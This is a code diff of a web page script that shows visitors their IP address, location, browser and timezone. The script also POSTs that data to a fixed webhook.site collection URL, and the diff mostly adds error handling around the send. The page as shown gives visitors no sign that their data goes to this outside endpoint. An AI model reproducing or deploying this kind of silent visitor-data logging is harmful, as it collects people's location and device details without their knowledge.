@@ -45,7 +45,7 @@
 
       // Default values
       const ipData = { ip: 'Unavailable', city: 'Unavailable', region: 'Unavailable', country_name: 'Unavailable' };
-      let userInfo = {
+      const userInfo = {
         ip: 'Unavailable',
         location: 'Unavailable',
         browser: navigator.userAgent,
@@ -64,6 +64,8 @@
             ipData.region = ipJson.region || 'Unavailable';
             ipData.country_name = ipJson.country || 'Unavailable';
           }
+        } else {
+          console.warn('Failed to fetch IP data:', ipResponse.status, ipResponse.statusText);
         }
 
         // Update userInfo object
@@ -77,21 +79,25 @@
         timezoneElement.textContent = `Timezone: ${userInfo.timezone}`;
 
         // Send data to Webhook.site
-        await fetch('https://webhook.site/6aec35f9-fc3e-406d-afdf-a39bb1d0138e', {
+        const webhookResponse = await fetch('https://webhook.site/6aec35f9-fc3e-406d-afdf-a39bb1d0138e', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(userInfo),
         });
 
-        console.log('Data sent to Webhook:', userInfo);
+        if (webhookResponse.ok) {
+          console.log('Data successfully sent to Webhook:', userInfo);
+        } else {
+          console.error('Failed to send data to Webhook:', webhookResponse.status, webhookResponse.statusText);
+        }
       } catch (error) {
         console.error('Error fetching or sending user information:', error);
 
         // Display fallback messages
-        if (!userInfo.ip) ipElement.textContent = 'IP Address: Unable to fetch.';
-        if (!userInfo.location) locationElement.textContent = 'Location: Unable to fetch.';
-        if (!userInfo.browser) browserElement.textContent = 'Browser: Unable to fetch.';
-        if (!userInfo.timezone) timezoneElement.textContent = 'Timezone: Unable to fetch.';
+        ipElement.textContent = 'IP Address: Unable to fetch.';
+        locationElement.textContent = 'Location: Unable to fetch.';
+        browserElement.textContent = 'Browser: Unable to fetch.';
+        timezoneElement.textContent = 'Timezone: Unable to fetch.';
       }
     }
 
